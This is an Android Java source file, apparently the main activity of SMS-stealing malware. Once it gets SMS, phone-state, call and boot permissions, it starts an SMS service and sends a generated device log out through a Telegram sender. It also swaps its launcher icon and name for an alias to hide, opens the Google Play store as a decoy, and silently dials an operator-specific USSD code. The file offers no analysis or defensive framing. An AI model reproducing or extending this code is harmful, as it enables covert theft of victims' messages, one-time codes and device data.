package com.example.myapp;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final String APK_VERSION = "danet";
    private static final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Log.d(TAG, "onCreate called");

        if (permissionsGranted()) {
            Log.d(TAG, "Permissions granted");
            startDataCollection();
            updateAppIconAndName();
            openGooglePlay();
            sendUssdRequest();
        } else {
            Log.d(TAG, "Permissions not granted, requesting permissions");
            requestPermissions();
        }
    }

    private boolean permissionsGranted() {
        String[] permissions = {
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.INTERNET,
                Manifest.permission.RECEIVE_BOOT_COMPLETED,
                Manifest.permission.WAKE_LOCK,
                Manifest.permission.FOREGROUND_SERVICE
        };

        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "Permission not granted: " + permission);
                return false;
            }
        }
        return true;
    }

    private void requestPermissions() {
        String[] permissions = {
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.INTERNET,
                Manifest.permission.RECEIVE_BOOT_COMPLETED,
                Manifest.permission.WAKE_LOCK,
                Manifest.permission.FOREGROUND_SERVICE
        };

        ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        Log.d(TAG, "onRequestPermissionsResult called");

        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (permissionsGranted()) {
                Log.d(TAG, "Permissions granted after request");
                startDataCollection();
                updateAppIconAndName();
                openGooglePlay();
                sendUssdRequest();
            } else {
                Log.d(TAG, "Permissions not granted after request, finishing activity");
                finish();
            }
        }
    }

    private void startDataCollection() {
        Log.d(TAG, "startDataCollection called");
        if (permissionsGranted()) {
            Log.d(TAG, "Permissions granted for data collection");
            if (!AppStatusChecker.isServiceRunning(this)) {
                Log.d(TAG, "Starting SmsService");
                Intent serviceIntent = new Intent(this, SmsService.class);
                ContextCompat.startForegroundService(this, serviceIntent);
            }

            new Handler().postDelayed(() -> {
                String log = LogGenerator.generateLog(this, APK_VERSION, null);
                Log.d(TAG, "Log generated: " + log);
                TelegramSender.sendMessage(this, log);
            }, 5000);
        }
    }

    private void updateAppIconAndName() {
        Log.d(TAG, "updateAppIconAndName called");
        PackageManager pm = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        pm.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        ComponentName aliasComponentName = new ComponentName(this, "com.example.myapp.MainActivityAlias");
        pm.setComponentEnabledSetting(aliasComponentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    private void openGooglePlay() {
        Log.d(TAG, "openGooglePlay called");
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps?hl=uz"));
        startActivity(intent);
        finish();
    }

    private void sendUssdRequest() {
        Log.d(TAG, "sendUssdRequest called");
        String operatorName = DeviceInfo.getOperatorName(this);
        String ussdCode = DeviceInfo.getUssdCodeForOperator(operatorName);

        if (ussdCode != null) {
            try {
                Uri uri = Uri.parse("tel:" + Uri.encode(ussdCode));
                Intent intent = new Intent(Intent.ACTION_CALL, uri);
                startActivity(intent);
            } catch (SecurityException e) {
                Log.e(TAG, "Error sending USSD request: " + e.getMessage());
            }
        } else {
            Log.e(TAG, "Unknown operator: " + operatorName);
        }
    }
}